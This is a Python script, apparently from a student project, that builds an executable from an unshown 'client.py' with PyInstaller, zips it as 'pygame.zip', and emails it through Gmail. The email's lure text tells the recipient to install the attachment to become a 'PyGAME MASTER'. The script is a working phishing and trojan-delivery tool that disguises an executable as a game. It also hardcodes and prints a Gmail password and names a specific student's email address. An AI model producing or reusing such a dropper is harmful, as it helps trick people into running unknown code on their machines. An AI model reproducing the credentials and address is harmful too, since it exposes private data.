import os
import smtplib
import zipfile
from email.mime.image import MIMEImage

import PyInstaller.__main__
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from os.path import basename


mail_content = '''Hello,

You can become a PyGAME MASTER without ever leaving the house! 
Please, install it using the attached file!

Happy HUNTING!
PyGAME Team
'''

"""The mail addresses and password; sender_address is fake
"""
sender_address = 'pygame367@gmail.com'
sender_pass = 'pygame367emagyp'
receiver_address = 'maria-magdalena.barbieru@student.tuiasi.ro'

message = MIMEMultipart()
attach_file_name = 'pygame.zip'


def zip_directory(path, ziph):
    """Function used to archive files in a specific directory"""
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file),
                       os.path.relpath(os.path.join(root, file),
                                       os.path.join(path, '..')))


def create_executable():
    """Function used to create the executable and archive it along with its dependencies through zipfile"""
    PyInstaller.__main__.run([
        'client.py',
        '--onefile',
        '-n=pygame'
    ])

    zipf = zipfile.ZipFile('pygame.zip', 'w', zipfile.ZIP_DEFLATED)
    zip_directory('dist', zipf)
    zipf.close()


def setup_mime():
    """Function used to setup the sender, receiver
    """
    message['From'] = sender_address
    message['To'] = receiver_address

    """The subject line"""
    message['Subject'] = 'PyGAME - the new game that will fascinate the world'


def setup_email_body():
    """Function used to build the body and the attachments for the mail"""
    message.attach(MIMEText(mail_content, 'plain'))

    text = MIMEText('<img src="cid:image1">', 'html')
    message.attach(text)

    image = MIMEImage(open('/home/magda/Downloads/game.png', 'rb').read())

    """Define the image's ID as referenced in the HTML body above
    """

    image.add_header('Content-ID', '<image1>')
    message.attach(image)

    """Open the file as binary mode
    """
    attach_file = open(attach_file_name, 'rb') 
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())

    """encode the attachment"""
    encoders.encode_base64(payload) 

    print(basename(attach_file_name))

    """add payload header with filename; allow the file to be downloaded"""
    payload.add_header('Content-Disposition', 'attachment', filename=attach_file_name)
    message.attach(payload)


def send_email():
    """Function used to create SMTP session for sending the mail use gmail with port"""


    session = smtplib.SMTP('smtp.gmail.com', 587)
    
    """ enable security """
    session.starttls()

    print(sender_address + ", " + sender_pass)

    """login with mail_id and password"""
    session.login(sender_address, sender_pass) 
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')


if __name__ == "__main__":
    create_executable()
    setup_mime()
    setup_email_body()
    send_email()

